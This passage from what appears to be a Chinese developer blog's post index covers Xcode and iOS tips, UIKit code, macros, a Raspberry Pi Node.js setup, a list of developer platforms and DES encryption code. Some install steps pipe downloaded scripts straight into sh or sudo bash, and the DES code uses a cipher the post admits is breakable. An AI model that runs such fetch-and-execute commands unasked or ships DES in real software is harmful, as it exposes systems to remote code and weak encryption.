下载地址：https://github.com/alexzielenski/ThemeEngine\ncartool：Mac下的命令行小工具，能够将Assets.car文件解包到指定文件夹。目标文件夹需要事先创建好。该工具使用私有API中的CoreUI进行开发。 下载地址：https://github.com/steventroughtonsmith/cartool\n./cartool Assets.car outputDir\n\nacextract：Mac下的命令行工具，Swift版。 下载地址：https://github.com/bartoszj/acextract\n[iPhone 6 屏幕揭秘](iPhone 6屏幕揭秘.pdf)iOS 通过获取iTunes上的APP信息，判断是否提醒升级APPPOST https://itunes.apple.com/CN/lookup?id=978591579\n\n使用POST方法，id 是iTunes connect里APP信息的Apple ID：为APP自动生成的id\nCharles 请求 HTTPS 出现 “You may need to configure your browser or application to trust the Charles Root Certificate. See SSL Proxying in the Help menu”首先确认是否安装了 Charles 的证书，该证书在菜单 Help -&gt; SSL Proxying 下，需要同时安装在 Mac 和 模拟器或者设备上，具体使用方法参见子菜单。其次因为 10.3 以上系统需要你在“证书信任设置”中信任 Charles 的证书。在设备上点击设置 -&gt; 通用 -&gt; 关于本机 -&gt; 证书信任设置 -&gt; 选择 Charles 的证书打开。\n通过 Apple Configurator 下载 ipa 包\n安装Apple Configurator\n打开Apple Configurator，连接 iOS 设备\n点击导航栏的添加按钮选择 Apps，然后点选你需要的app，点击添加后，将会开始下载。\n下载完成后，先别点击任何选项！打开Finder，然后进入这个路径 ~/Library/Group Containers/K36BKF7T3D.group.com.apple.configurator/Library/Caches/Assets/TemporaryItems/MobileApps/ 就可以看到你刚下载的 ipa 包。这个是临时文件，你关闭 Apple Configurator 或者点选后会自动消失的。\n\n\n\nXcodeiOS开发证书显示“此证书的签发者无效”解决方法原因：Apple Worldwide Developer Relations Certification Authority Intermediate Certificate 证书过期。\n解决办法：\n\n在『钥匙串访问』的菜单项中选择显示已过期证书，删除已过期证书。\n在Apple PKI网页下载最新的证书：https://developer.apple.com/certificationauthority/AppleWWDRCA.cer ，双击导入即可。\n\nXcode常见报错锦囊Xcode只显示iOS Simulator的identifier，没有显示device version当安装多个版本的Xcode时，有可能会在某个Xcode中出现相同机型相同版本的多个模拟器  \n解决办法：\n\n退出Xcode.app, iOS Simulator.app等\n执行命令关闭模拟器服务：sudo killall -9 com.apple.CoreSimulator.CoreSimulatorService\n执行命令删除所有已经存在的模拟器：rm -rf ~/Library/Developer/CoreSimulator/Devices\n重启Xcode，就可以看到在~/Library/Developer/CoreSimulator/Devices目录，新生成的模拟器设备。\n这样就不会有重复的模拟器设备了。\n\n如何删除Xcode Downloads中的Components解决办法：\n\n退出Xcode.app, iOS Simulator.app等  \ncd /Library/Developer/CoreSimulator/Profiles/Runtimes，如果已下载，可以在该目录中找到simruntime文件\n删除对应模拟器版本\n清空目录：rm -rf ~/Library/Developer/CoreSimulator/Devices\n重启Xcode，让Xcode重新生成模拟器设备.\n\n完全卸载 Xcode终端输入以下命令：sudo /Developer/Library/uninstall-devtools —mode=all\nXcode 6.x的Scheme选项在 OS X El Capitan(10.11)中消失解决办法：将Xcode的窗口拉长或者全屏就会出现\nXcode 7.1 无法安装Alcatraz插件\n关闭Xcode\n移除之前安装的Xcode默认项\n\ndefaults delete com.apple.dt.Xcode DVTPlugInManagerNonApplePlugIns-Xcode-7.0\n\n卸载Alcatraz\n\nrm -rf ~/Library/Application\\ Support/Developer/Shared/Xcode/Plug-ins/Alcatraz.xcplugin\n\n移除所有通过Alcatraz安装的包\n\nrm -rf ~/Library/Application\\ Support/Alcatraz/\n\n更新已安装插件的DVTPlugInCompatibilityUUID到7.1\n\nfind ~/Library/Application\\ Support/Developer/Shared/Xcode/Plug-ins -name Info.plist -maxdepth 3 | xargs -I&#123;&#125; defaults write &#123;&#125; DVTPlugInCompatibilityUUIDs -array-add `defaults read /Applications/Xcode.app/Contents/Info DVTPlugInCompatibilityUUID`\n\n重置Xcode Selectsudo xcode-select --reset\n打开Xcode\n安装 Alcatraz\n\ncurl -fsSL https://raw.github.com/supermarin/Alcatraz/master/Scripts/install.sh | sh\n\n重启Xcode\n选择”Load Bundles”启动Xcode\n\nXcode 安装编译后的.app文件安装之前需要启动iOS模拟器。  \n$ [Xcode安装路径]/Contents/Developer/usr/bin/simctl install booted [要安装的APP路径]\n\n示例命令：\n$ /Applications/Xcode.app/Contents/Developer/usr/bin/simctl install booted ~/Desktop/Examine.app\n\n关闭 Xcode 8 终端打印一大堆日志终端中打印的日志格式类似如下：\nsubsystem: com.apple.UIKit, category: HIDEventFiltered, enable_level: 0, persist_level: 0, default_ttl: 0, info_ttl: 0, debug_ttl: 0, generate_symptoms: 0, enable_oversize: 1, privacy_setting: 2, enable_private_data: 0\n\n解决办法：Edit Scheme -&gt; Run -&gt; Arguments，在Environment Variables里边添加OS_ACTIVITY_MODE ＝ Disable\n\nXcode 7.x 中使用 Xcode 8 的新字体 SF Mono从安装有 Xcode 8 的路径 /Application/Xcode.app/Contents/SharedFrameworks/DVTKit.framework/Versions/A/Resources/Fonts 下能找到这些字体。\n选中所有字体拖拽到 Font Book.app（字体册）中，这样在 Xcode 7 中就可以选择了。\n我自己将字体压缩了下，可以从这个地址下载： SF Mono 字体\nXcode Tips Trickshttps://www.hackingwithswift.com/articles/229/24-quick-xcode-tips\nXcode Snippets关于 Xcode Snippets 的介绍，可以通过这篇文章了解，以及如何生成自定义的代码片段。\n安装 NShipster 提供的代码片段仓库地址：https://github.com/Xcode-Snippets\n\n安装命令行工具：gem install xcodesnippet\n下载代码仓库：git clone https://github.com/Xcode-Snippets/Objective-C.git\n进入该目录添加单条代码片段：xcodesnippet install path/to/source.m\n该目录下有很多代码片段，可以通过命令批量添加：ls -1 | xargs -L1 xcodesnippet install\n\n安装唐巧提供的代码片段仓库地址：https://github.com/tangqiaoboy/xcode_tool\n\n下载项目仓库：git clone https://github.com/tangqiaoboy/xcode_tool\ncd xcode_tool\n./setup_snippets.sh\n\n需要注意的是唐巧提供的代码片段，以后需要更新时可以直接仓库即可。\nUnderstanding and Analyzing Application Crash Reports详情链接：https://developer.apple.com/library/content/technotes/tn2151/_index.html\nFoundation获取程序沙盒Document目录NSArray *paths = NSSearchPathForDictionariesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);NSString *documentsDirectory = [paths objectAtIndex:0];\n\nObjective-C 关键字\n消息传递![消息传递-how choose](2017-01-18-消息传递-how choose.png)\n队列组// 1.创建队列组dispatch_group_t group =  dispatch_group_create();// 2.1第一个队列组异步dispatch_group_async(group, dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^&#123;    // 执行1个耗时的异步操作&#125;);// 2.2第二个队列组异步dispatch_group_async(group, dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^&#123;    // 执行1个耗时的异步操作&#125;);// 3.所有队列组异步线程结束后dispatch_group_notify(group, dispatch_get_main_queue(), ^&#123;    // 等前面的异步操作都执行完毕后，回到主线程...&#125;);\n\nSwift 命令行程序接收用户输入Swift 2.3// 标准输入设备let stdin = NSFileHandle.fileHandleWithStandardInput()let inputData = keyboard.availableDatavar inputStr = NSString(data: inputData, encoding: NSUTF8StringEncoding)// 处理换行符inputStr = inputStr?.stringByReplacingOccurrencesOfString(&quot;\\n&quot;, withString: &quot;&quot;)\n\n// Swift 3.0readLine()\n\n获取变量内存地址unsafeAddressOf(_:)\n返回类对象的指针，类型为UnsafePointer\n\n函数原型func unsafeAddressOf(_ object: AnyObject) -&gt; UnsafePointer\n\n示例代码\nvar str = &quot;Hello, playground&quot;print(unsafeAddressOf(str))// 0x00007f859a404ca0\n\nfunc withUnsafePointer&lt;T, Result&gt;(_: inout T, _: @noescape (UnsafePointer) throws -&gt; Result)Invokes body with an UnsafePointer to arg and returns the result. Useful for calling Objective-C APIs that take “in&#x2F;out” parameters (and default-constructible “out” parameters) by pointer.\n\n函数原型func withUnsafePointer&lt;T, Result&gt;(_ arg: inout T, _ body: @noescape (UnsafePointer) throws -&gt; Result) rethrows -&gt; Result\n\n示例代码\nstruct Point &#123;    var x: CGFloat, y: CGFloat&#125;var point = Point(x: 10, y: 10)print(withUnsafePointer(&amp;point) &#123;UnsafePointer&lt;Point&gt;($0)&#125;)// 0x0000000115e3f8d8\n\nQuick Swift Tips and Tricks![Swift Quick Tips](2016-12-26-Swift Quick Tips.png)\nUIUITableView取消cell的分割线tableview.separatorStyle = UITableViewCellSeparatorStyleNone;\n\nUITabelViewCell 的高亮状态的取消-(void)tableView:(UITableView *)tableView willDisplayCell:(UITableViewCell *)cell forRowAtIndexPath:(NSIndexPath *)indexPath&#123;    //设置cell的背景是透明的。    cell.backgroundColor = [UIColor clearColor];    //取消cell的高亮状态    cell.selectionStyle = UITableViewCellSelectionStyleNone;&#125;//使用下面的这个方法会导致cell不能响应点击事件- (BOOL)tableView:(UITableView *)tableView shouldHighlightRowAtIndexPath:(NSIndexPath *)indexPath &#123;    return YES;&#125;\n设置分割线的左右偏移量tableView.separatorInset = UIEdgeInsetsMake(0, 100, 0, 0);\n\nTableView不显示没内容的Cellself.tableView.tableFooterView = [[UIView alloc] init];\n\n或者\ntableView.separatorColor = [UIColor clearColor];\n\n更改tableviewcell的小对勾的颜色tableView.tintColor = [UIColor redColor];\n\nUITableView 在页面加载完成后滚动到底部方法原型：- (void)selectRowAtIndexPath:(NSIndexPath *)indexPath animated:(BOOL)animated scrollPosition:(UITableViewScrollPosition)scrollPosition\n- (void) viewDidAppear:(BOOL)animated &#123;\t[super viewDidAppear:animated];\t[self.tableView selectRowAtIndexPath:indexPath animated:NO scrollPosition:UITableViewScrollPositionBottom];&#125;\n\n隐藏GroupedTableView上边多余的间隔第一个 Section 距离屏幕顶端有间隔，解决这个问题有三种方式。\n\n方式一：设置UITableViewHeaderCGRect frame = CGRectMake(0, 0, 0, CGFLOAT_MIN);self.tableView.tableHeaderView = [[UIView alloc] initWithFrame:frame];\n\n方式二：Storyboard在第一个 Section 的上面拖进来一个空 UIView，设置view的height为0.1。\n方式三：实现heightForHeaderInSection协议方法- (CGFloat) tableView:(UITableView *)tableView heightForHeaderInSection:(NSInteger)section&#123;    if (section == 0)        return CGFLOAT_MIN;    return tableView.sectionHeaderHeight;&#125;\n\nUINavigationBar自定义leftBarbuttonItem，左滑返回手势失效self.navigationItem.leftBarButtonItem = [[UIBarButtonItem alloc] initWithImage:img style:UIBarButtonItemStylePlain target:self action:@selector(onBack:)];self.navigationController.interactivePopGestureRecognizer.delegate = (id&lt;UIGestureRecognizerDelegate&gt;)self;\n\n滑动隐藏NavigationBarnavigationController.hidesBarsOnSwipe = Yes\n导航条返回键隐藏title[[UIBarButtonItem appearance] setBackButtonTitlePositionAdjustment:UIOffsetMake(0, -60) forBarMetrics:UIBarMetricsDefault];\nNavigationBar透明而不是带模糊的效果[self.navigationBar setBackgroundImage:[UIImage new] forBarMetrics:UIBarMetricsDefault];self.navigationBar.shadowImage = [UIImage new];self.navigationBar.translucent = YES;\n\n改变导航栏里返回按钮的图标颜色self.navigationController.navigationBar.tintColor = [UIColor whiteColor];\n拉伸图片，图片不变形UIImage *image = [[UIImage imageNamed:@&quot;xxx&quot;] stretchableImageWithLeftCapWidth:10 topCapHeight:10];\nScrollView莫名其妙不能在viewController划到顶self.automaticallyAdjustsScrollViewInsets = NO;\n怎么点击self.view就让键盘收起两种方法：\n- (void)touchesBegan:(NSSet *)touches withEvent:(UIEvent *)event&#123;   [self.view endEditing:YES];&#125;\n\n- (BOOL)canBecomeFirstResponder &#123;\treturn YES;&#125;- (void)touchesBegan:(NSSet *)touches withEvent:(UIEvent *)event&#123;   [self becomeFirstResponder];&#125;\n\n修改状态栏样式在info.plist文件中添加UIViewControllerBasedStatusBarAppearance设置为NO[[UIApplication sharedApplication] setStatusBarStyle:UIStatusBarStyleLightContent];\n一句话解决倒计时问题，比如获取验证码倒计时\nWKWebView的使用和各种坑的解决方法（OC＋Swift）UIImageView加载WebP格式的图片WebP格式简介：http://isux.tencent.com/introduction-of-webp.html\nWebP格式图片示例：&lt;1.sm.webp&gt;\n使用CocoaPods和SDWebImagepod &#x27;SDWebImage&#x27;pod &#x27;SDWebImage/WebP&#x27;\n\n使用CocoaPods和YYWebImagepod &#x27;YYWebImage&#x27;pod &#x27;YYImage/WebP&#x27;\n\nUINavigationControllerNavigationController中跳转比如视图控制器，A——&gt;B——&gt;C——&gt;D，现在在D页面中返回时跳转到不在导航控制器栈中的F视图控制器。\nNSMutableArray * vcs = [NSMutableArray arrayWithArray:self.navigationController.viewControllers];FViewController *fVC = [[FViewController alloc] init];[vcs insertObject:fVC atIndex:vcs.count - 1];self.navigationController.viewControllers = vcs;\n\n\n常用宏尺寸宏#define StatusBar_HEIGHT 20#define NavigationBar_HEIGHT 44#define NavigationBarIcon 20#define TabBar_HEIGHT 49#define TabBarIcon 30#define SCREEN_WIDTH ([UIScreen mainScreen].bounds.size.width)#define SCREEN_HEIGHT ([UIScreen mainScreen].bounds.size.height)\n\n打印宏//直接替换NSLog#if DEBUG#define NSLog(FORMAT, ...) fprintf(stderr,&quot;\\n%s:%d %s \\t%s\\n&quot;, [[[NSString stringWithUTF8String:__FILE__] lastPathComponent] UTF8String], __LINE__, __FUNCTION__, [[NSString stringWithFormat:FORMAT, ##__VA_ARGS__] UTF8String]);#else#define NSLog(FORMAT, ...) nil#endif\n\n系统宏// 获取版本#define IOS_VERSION [[[UIDevice currentDevice] systemVersion] floatValue]#define CurrentSystemVersion [[UIDevice currentDevice] systemVersion]// 获取当前语言#define CurrentLanguage ([[NSLocale preferredLanguages] objectAtIndex:0])// 判断是真机还是模拟器#if TARGET_OS_IPHONE//iPhone Device#endif#if TARGET_IPHONE_SIMULATOR//iPhone Simulator#endif// 检查系统版本#define SYSTEM_VERSION_EQUAL_TO(v)                  ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] == NSOrderedSame)#define SYSTEM_VERSION_GREATER_THAN(v)              ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] == NSOrderedDescending)#define SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(v)  ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] != NSOrderedAscending)#define SYSTEM_VERSION_LESS_THAN(v)                ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] == NSOrderedAscending)#define SYSTEM_VERSION_LESS_THAN_OR_EQUAL_TO(v)    ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] != NSOrderedDescending)\n\n内存宏// 使用ARC和不使用ARC#if __has_feature(objc_arc)//compiling with ARC#else// compiling without ARC#endif#pragma mark - common functions#define RELEASE_SAFELY(__POINTER) &#123; [__POINTER release]; __POINTER = nil; &#125;//释放一个对象#define SAFE_DELETE(P) if(P) &#123; [P release], P = nil; &#125;#define SAFE_RELEASE(x) [x release];x=nil\n\n颜色宏// rgb颜色转换（16进制-&gt;10进制）#define UIColorFromRGB(rgbValue) [UIColor colorWithRed:((float)((rgbValue &amp; 0xFF0000) &gt;&gt; 16))/255.0 green:((float)((rgbValue &amp; 0xFF00) &gt;&gt; 8))/255.0 blue:((float)(rgbValue &amp; 0xFF))/255.0 alpha:1.0]// RGB颜色#define RGBCOLOR(r, g, b) [UIColor colorWithRed:(r)/255.0f green:(g)/255.0f blue:(b)/255.0f alpha:1]#define RGBACOLOR(r, g, b, a) [UIColor colorWithRed:(r)/255.0f green:(g)/255.0f blue:(b)/255.0f alpha:(a)]// 背景色#define BACKGROUNDCOLOR [UIColor colorWithRed:242.0/255.0 green:236.0/255.0 blue:231.0/255.0 alpha:1.0]// 清除背景色#define CLEARCOLOR [UIColor clearColor]\n\n其他宏//方正黑体简体字体定义#define FONT(F) [UIFont fontWithName:@&quot;FZHTJW--GB1-0&quot; size:(F)]//定义一个API#define BaseAPIURL                @&quot;http://xxxxx/&quot;//登陆API#define APILogin              [APIURL stringByAppendingString:@&quot;Login&quot;]//设置View的tag属性#define VIEWWITHTAG(_OBJECT, _TAG)    [_OBJECT viewWithTag : _TAG]//G－C－D#define BACK(block) dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), block)#define MAIN(block) dispatch_async(dispatch_get_main_queue(),block)//NSUserDefaults 实例化#define USER_DEFAULT [NSUserDefaults standardUserDefaults]//由角度获取弧度 有弧度获取角度#define degreesToRadian(x) (M_PI * (x) / 180.0)#define radianToDegrees(radian) (radian*180.0)/(M_PI)\n\n单例宏#define SYNTHESIZE_SINGLETON_FOR_CLASS(classname) \\\\static classname *shared##classname = nil; \\\\+ (classname *)shared##classname \\&#123; \\@synchronized(self) \\&#123; \\if (shared##classname == nil) \\&#123; \\shared##classname = [[self alloc] init]; \\&#125; \\&#125; \\\\return shared##classname; \\&#125; \\\\+ (id)allocWithZone:(NSZone *)zone \\&#123; \\@synchronized(self) \\&#123; \\if (shared##classname == nil) \\&#123; \\shared##classname = [super allocWithZone:zone]; \\return shared##classname; \\&#125; \\&#125; \\\\return nil; \\&#125; \\\\- (id)copyWithZone:(NSZone *)zone \\&#123; \\return self; \\&#125;\n\n第三方库键盘遮挡IQKeyboardManager\niOS动画帧速计算类库KMCGeigerCounter\nGif 播放FLAnimatedImage\n其他版本号的命名根据国际主流的惯例，使用「语义化版本（Semantic Versioning）」的命名方式，有时简称 SemVer。  \n语义化版本号（以下简称「版本号」）的格式是：&lt;major&gt;.&lt;minor&gt;.&lt;patch&gt; 。如：1.4.15、6.2.0。\n每一位版本号的含义\n&lt;major&gt; 即主版本号，俗称大版本升级。改动到主版本号时，标志着 API 发生了巨大变化，包括但不限于新增特性、修改机制、删除功能， 一般不兼容上一个主版本号。\n&lt;minor&gt; 即次版本号，俗称小版本升级。当我们进行常规的新增或修改功能时，改动次版本号，但是 必须是向前兼容的。这也意味着我们 不能直接删除某个功能。如若必要，我们可以在 changelog 中标记某项功能为「即将删除（Deprecated）」，然后在下一个大版本中将其彻底删除。\n&lt;patch&gt; 即修订号，俗称 bug 修复。顾名思义，如果仅仅为了修复或调整一些小问题，我们就只改动修订号。\n\n注意事项\n版本号前不要加 v。\n不要在数字前补 0。错误示例：01.12.03。\n每一位版本号按照 +1 的速度递增，不要在版本号之间跳跃。\n主版本号停留在 0 的版本号，即 0.x.x 应当视作还在内部开发阶段的代码。如果代码有公共 API，此时不宜对外公开。\n1.0.0 的版本号用于界定公共 API 的形成。\n当次版本号递增时，修订号归零；当主版本号递增时，次版本号、修订号归零。\n进行新的开发时，版本号从 0.1.0 开始。\n如果不小心把一个不兼容的改版当成了次版本号发行，应当发行一个新的次版本号来更正这个问题并且恢复向下兼容。注意 不能去修改已发行的版本。\n\n一个典型的版本号发展示例\n0.1.0\n0.1.1\n0.1.2\n0.2.0\n1.0.0\n1.1.0\n1.1.1\n……\n\n","categories":["iOS"],"tags":["Tips"]},{"title":"Linux RaspberryPi","url":"/2016/05/28/Linux-RaspberryPi/","content":"安装Node.js# Using Ubuntucurl -sL https://deb.nodesource.com/setup_6.x | sudo -E bash -sudo apt-get install -y nodejs# Using Debian, as rootcurl -sL https://deb.nodesource.com/setup_6.x | bash -apt-get install -y nodejs\n\n\n","categories":["Linux"],"tags":["RaspberryPi"]},{"title":"开发平台","url":"/2016/05/27/Develop-Platform/","content":"BasS （后端即服务）\n\n\n平台\n作用\n链接\n\n\n\nLeanCloud\n存储、消息推送、用户分析、扩展模块\nhttps://leancloud.cn/\n\n\nBmob\n云数据库、文件服务、消息推送、短信验证码\nhttp://www.bmob.cn/\n\n\n七牛\n云存储\nhttp://www.qiniu.com/\n\n\n环信\n即时通讯\nhttp://www.easemob.com/\n\n\n融云\n即时通讯\nhttp://www.rongcloud.cn/\n\n\nCloudKit\niCloud 的 SDK，使用 CloudKit 让开发者的 iOS 应用和 OS X 应用共享数据\nhttps://developer.apple.com/icloud/index.html\n\n\n友盟\n为中国移动开发者提供免费的统计分析服务及开发者工具\nhttp://www.umeng.com\n\n\n极光推送\n专注推送的 BasS 服务提供商\nhttps://www.jpush.cn\n\n\nFlurry\nYahoo的App分析统计工具集\nhttps://developer.yahoo.com\n\n\nGoogle Analytics\nGoogle的移动分析统计\nhttp://www.google.com/intl/zh-CN_ALL/analytics/index.html\n\n\nMTA\n腾讯云统计\nhttp://mta.qq.com\n\n\nApp Annie\n数据统计分析\nhttps://www.appannie.com/cn/\n\n\n\n\n网络接口\n\n\n名称\n链接\n备注\n\n\n\n百度APIStore\nhttp://apistore.baidu.com\n大多数免费但数据很多数据格式非常垃圾不好解析\n\n\n天行数据TxAPI\nhttp://api.huceo.com/\n免费、数据格式规范但每个账号有使用次数的限制\n\n\n天狗云\nhttp://www.tngou.net/\n提供健康医疗类数据的免费API\n\n\n聚合数据\nhttps://www.juhe.cn/\n部分API免费但需要实名认证\n\n\nAPiX\nhttp://apix.cn/\n专业数据API但都需要付费\n\n\n阿凡达数据\nhttp://www.avatardata.cn/\n很多免费的API部分付费的API\n\n\n第三方服务\n\n\n第三方平台\n注册地址\n\n\n\n新浪微博\nhttp://open.weibo.com\n\n\n腾讯微博\nhttp://dev.t.qq.com\n\n\nQQ空间\nhttp://connect.qq.com/intro/login/\n\n\nQQ\nhttp://mobile.qq.com/api/\n\n\n微信\nhttp://open.weixin.qq.com\n\n\n搜狐微博\nhttp://open.t.sohu.com\n\n\n豆瓣\nhttp://developers.douban.com\n\n\n人人网\nhttp://dev.renren.com\n\n\n开心网\nhttp://open.kaixin001.com\n\n\nInstapaper\nhttp://www.instapaper.com/main/request_oauth_consumer_token\n\n\n有道云笔记\nhttp://note.youdao.com/open/developguide.html#app\n\n\nFacebook\nhttps://developers.facebook.com\n\n\nTwitter\nhttps://dev.twitter.com\n\n\n崩溃收集国内\nBugly http://bugly.qq.com\nBugHD https://bughd.com\n\n国外\nCrashlytics http://try.crashlytics.com\n\n内测分发\n蒲公英 https://www.pgyer.com\nFIR http://fir.im\nTestFlight：苹果自家的内测渠道 https://developer.apple.com/testflight/\n\n","categories":["iOS"],"tags":["Tools","开发平台"]},{"title":"iOS 密码技术","url":"/2016/06/13/iOS-Common-Crypto/","content":"转码技术URL转码（百分号转码）URL：只有字母和数字[0-9a-zA-Z]、一些特殊符号$-_.+!*&#39;(),[不包括双引号]、以及某些保留字，才可以不经过编码直接用于URL。\nURL 编码实现// 废弃接口- (NSString *)stringByAddingPercentEscapesUsingEncoding:(NSStringEncoding)encoding// iOS 7 之后- (NSString *)stringByAddingPercentEncodingWithAllowedCharacters:(NSCharacterSet *)allowedCharacters\n\nURL 解码实现// 废弃接口- (NSString *)stringByReplacingPercentEscapesUsingEncoding:(NSStringEncoding)encoding// iOS 7 之后@property(readonly, copy) NSString *stringByRemovingPercentEncoding\n\n参考链接\nhttp://www.w3school.com.cn/tags/html_ref_urlencode.html\n维基百科\n在线工具\n\n\n\nBase64 转码Base64是一种基于64个可打印字符来表示二进制数据的表示方法。由于2的6次方等于64，所以每6个比特为一个单元，对应某个可打印字符。三个字节有24个比特，对应于4个Base64单元，即3个字节需要用4个可打印字符来表示。它可用来作为电子邮件的传输编码。在Base64中的可打印字符包括字母A-Z、a-z、数字0-9，这样共有62个字符，此外两个可打印符号在不同的系统中而不同。\nBase64索引表数值\t字符\t \t数值\t字符\t \t数值\t字符\t \t数值\t字符0\tA\t16\tQ\t32\tg\t48\tw1\tB\t17\tR\t33\th\t49\tx2\tC\t18\tS\t34\ti\t50\ty3\tD\t19\tT\t35\tj\t51\tz4\tE\t20\tU\t36\tk\t52\t05\tF\t21\tV\t37\tl\t53\t16\tG\t22\tW\t38\tm\t54\t27\tH\t23\tX\t39\tn\t55\t38\tI\t24\tY\t40\to\t56\t49\tJ\t25\tZ\t41\tp\t57\t510\tK\t26\ta\t42\tq\t58\t611\tL\t27\tb\t43\tr\t59\t712\tM\t28\tc\t44\ts\t60\t813\tN\t29\td\t45\tt\t61\t914\tO\t30\te\t46\tu\t62\t+15\tP\t31\tf\t47\tv\t63\t&#x2F;\n例子：编码『Man』文本：Man\nASCII编码：77 97 110\n二进制位：01001101 01100001 01101110\n索引：19 22 5 46\nBase64编码：TWFu\n如果要编码的字节数不能被3整除，最后会多出1个或2个字节，那么可以使用下面的方法进行处理：先使用0字节值在末尾补足，使其能够被3整除，然后再进行base64的编码。在编码后的base64文本后加上一个或两个’&#x3D;’号，代表补足的字节数。也就是说，当最后剩余一个八位字节（一个byte）时，最后一个6位的base64字节块有四位是0值，最后附加上两个等号；如果最后剩余两个八位字节（2个byte）时，最后一个6位的base字节块有两位是0值，最后附加一个等号。\nBase64 编码实现- (NSData *)base64EncodedDataWithOptions:(NSDataBase64EncodingOptions)options- (NSString *)base64EncodedStringWithOptions:(NSDataBase64EncodingOptions)options\n\nBase64 解码实现- (instancetype)initWithBase64EncodedData:(NSData *)base64Data options:(NSDataBase64DecodingOptions)options- (instancetype)initWithBase64EncodedString:(NSString *)base64String options:(NSDataBase64DecodingOptions)options\n\n参考链接\n维基百科\nhttp://tool.oschina.net/encrypt?type=3\n\n对称密码（共享密钥密码）——用相同的密钥进行加密和解密一次性密码本——绝对不会被破译的密码一次性密码本是一种非常简单的密码，它的原理是『将明文与一串随机的比特序列进行XOR运算』。\n为什么一次性密码本是绝对无法破译的呢？我们假设对一次性密码本的密文尝试进行暴力破解，那么总有一天我们会尝试到和加密时相同的密钥，但是我们无法判断它是否是正确的明文。\n一次性密码本是无条件安全的，在理论上是无法破译的。\nDES（Data Encryption Standard）DES是一种将64比特的明文加密成64比特的密文的对称密码算法，他的密钥长度是56比特。尽管从规格上来说，DES的密钥长度是64比特，但由于每隔7比特会设置一个用于错误检测的比特，因此实质上器密钥长度是56比特。\nPS：现在DES已经能够被暴力破解。\nDES加密实现/** *  DES加密 * *  @param data 加密的二进制数据 *  @param key  加密的密钥，长度为8字节 *  @param iv   初始化向量，每次加密时都会随机产生一个不同的比特序列来作为初始化向量 * *  @return 加密后的二进制数据 */NSData * desEncrypt(NSData * data, NSData * key, NSData * iv)&#123;\t// 密码长度为8字节      if ([key length] != 8) &#123;        @throw [NSException exceptionWithName:@&quot;DES Encrypt&quot;                                       reason:@&quot;Length of key is wrong. Length of iv should be 8(64bits)&quot;                                     userInfo:nil];    &#125;    // 加密后的数据长度为数据长度+DES block size    size_t bufferSize = [data length] + kCCBlockSizeDES;    void * buffer = malloc(bufferSize);    size_t encryptedSize = 0;    // DES加密    CCCryptorStatus cryptStatus = CCCrypt(kCCEncrypt,                                          kCCAlgorithmDES,                                          kCCOptionPKCS7Padding,                                          [key bytes], kCCKeySizeDES,                                          [iv bytes],                                          [data bytes],                                          [data length],                                          buffer, bufferSize,                                          &amp;encryptedSize);  \t// 判断加密是否成功    if (cryptStatus == kCCSuccess) &#123;        NSData * encryptedData = [NSData dataWithBytes:buffer length:encryptedSize];        free(buffer);        return encryptedData;    &#125;else&#123;        free(buffer);        @throw [NSException exceptionWithName:@&quot;DES Encrypt&quot;                                       reason:@&quot;Encrypt Error!&quot;                                     userInfo:nil];        return nil;    &#125;&#125;\n\nDES解密实现/** *  DES 解密 * *  @param data 解密的二进制数据 *  @param key  解密的密钥，长度8字节 *  @param iv   初始化向量 * *  @return 解密后的数据 */NSData *desDecrypt(NSData * data, NSData * key, NSData * iv)&#123;    if ([key length] != 8) &#123;        @throw [NSException exceptionWithName:@&quot;DES Encrypt&quot;                                       reason:@&quot;Length of key is wrong. Length of iv should be 8(64bits)&quot;                                     userInfo:nil];    &#125;    // 加密后的数据长度为数据长度+DES block size    size_t bufferSize = [data length] + kCCBlockSizeDES;    void * buffer = malloc(bufferSize);    size_t decryptedSize = 0;    CCCryptorStatus cryptStatus = CCCrypt(kCCDecrypt,                                          kCCAlgorithmDES,                                          kCCOptionPKCS7Padding,                                          [key bytes], kCCKeySizeDES,                                          [iv bytes],                                          [data bytes],                                          [data length],                                          buffer, bufferSize,                                          &amp;decryptedSize);    if (cryptStatus == kCCSuccess) &#123;        NSData * decryptedData = [NSData dataWithBytes:buffer length:decryptedSize];        free(buffer);        return decryptedData;    &#125;else&#123;        free(buffer);        @throw [NSException exceptionWithName:@&quot;DES Decrypt&quot;                                       reason:@&quot;Decrypt Error!&quot;                                     userInfo:nil];        return nil;    &#125;&#125;\n\n参考链接\nhttps://zh.wikipedia.org/wiki/資料加密標準\n\n3DES（ Triple Data Encryption Standard）** 三重DES（triple-DES）** 是为了增加DES的强度，将DES重复3次所得到的一种密码算法，通常缩写为3DES。\n\nhttps://zh.wikipedia.org/wiki/三重資料加密演算法\n\nAES（Advanced Encryption Standard）高级加密标准（英语：Advanced Encryption Standard，缩写：AES），在密码学中又称Rijndael加密法，是美国联邦政府采用的一种区块加密标准。这个标准用来替代原先的DES，已经被多方分析且广为全世界所使用。经过五年的甄选流程，高级加密标准由美国国家标准与技术研究院（NIST）于2001年11月26日发布于FIPS PUB 197，并在2002年5月26日成为有效的标准。2006年，高级加密标准已然成为对称密钥加密中最流行的算法之一。\n\nhttps://zh.wikipedia.org/wiki/高级加密标准\n\n对称加密&#x2F;解密实现CCCryptorStatus CCCrypt(    CCOperation op,         /* kCCEncrypt, etc. */    CCAlgorithm alg,        /* kCCAlgorithmAES128, etc. */    CCOptions options,      /* kCCOptionPKCS7Padding, etc. */    const void *key,    size_t keyLength,    const void *iv,         /* optional initialization vector */    const void *dataIn,     /* optional per op and alg */    size_t dataInLength,    void *dataOut,          /* data RETURNED here */    size_t dataOutAvailable,    size_t *dataOutMoved)\n\nCCOperation：加密解密操作/*!    @enum       CCOperation    @abstract   密码操作类型.    @constant   kCCEncrypt  对称加密.    @constant   kCCDecrypt  对称解密.*/enum &#123;    kCCEncrypt = 0,    kCCDecrypt,     &#125;;typedef uint32_t CCOperation;\n\nCCAlgorithm：加密算法/*!    @enum       CCAlgorithm    @abstract   Encryption algorithms implemented by this module.    @constant   